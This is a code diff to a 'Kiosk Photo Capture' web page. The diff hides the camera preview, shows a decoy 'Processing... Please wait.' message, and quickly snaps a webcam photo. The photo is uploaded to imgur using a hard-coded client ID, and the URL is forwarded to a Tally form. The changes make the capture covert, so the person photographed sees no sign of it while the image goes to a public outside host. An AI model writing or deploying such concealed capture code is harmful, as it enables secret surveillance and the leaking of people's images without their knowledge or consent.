@@ -4,20 +4,27 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Kiosk Photo Capture</title>
+    <style>
+        body { text-align: center; font-family: Arial, sans-serif; }
+        #loading { font-size: 20px; display: block; margin-top: 20%; }
+        video, canvas { display: none; }
+    </style>
 </head>
 <body>
+    <p id="loading">Processing... Please wait.</p>
     <video id="video" autoplay></video>
-    <canvas id="canvas" style="display: none;"></canvas>
+    <canvas id="canvas"></canvas>
+
     <script>
         const video = document.getElementById("video");
         const canvas = document.getElementById("canvas");
         const context = canvas.getContext("2d");
 
-        // Start camera
+        // Start camera (hidden)
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
-                setTimeout(capturePhoto, 3000); // Auto-capture after 3 seconds
+                video.onloadedmetadata = () => setTimeout(capturePhoto, 500); // Quick capture
             });
 
         function capturePhoto() {
@@ -33,9 +40,7 @@
 
             fetch("https://api.imgur.com/3/image", {
                 method: "POST",
-                headers: {
-                    "Authorization": "Client-ID 07dffe41da96ec7"
-                },
+                headers: { "Authorization": "Client-ID 07dffe41da96ec7" },
                 body: formData
             })
             .then(response => response.json())
@@ -47,8 +52,12 @@
                 const tallyFormURL = "https://tally.so/r/nGQ4OL";
                 window.location.href = `${tallyFormURL}?photo_url=${encodeURIComponent(photoURL)}&timestamp=${encodeURIComponent(timestamp)}`;
             })
-            .catch(error => console.error("Upload Error:", error));
+            .catch(error => {
+                console.error("Upload Error:", error);
+                document.getElementById("loading").textContent = "Error capturing photo. Try again.";
+            });
         }
     </script>
 </body>
 </html>
+
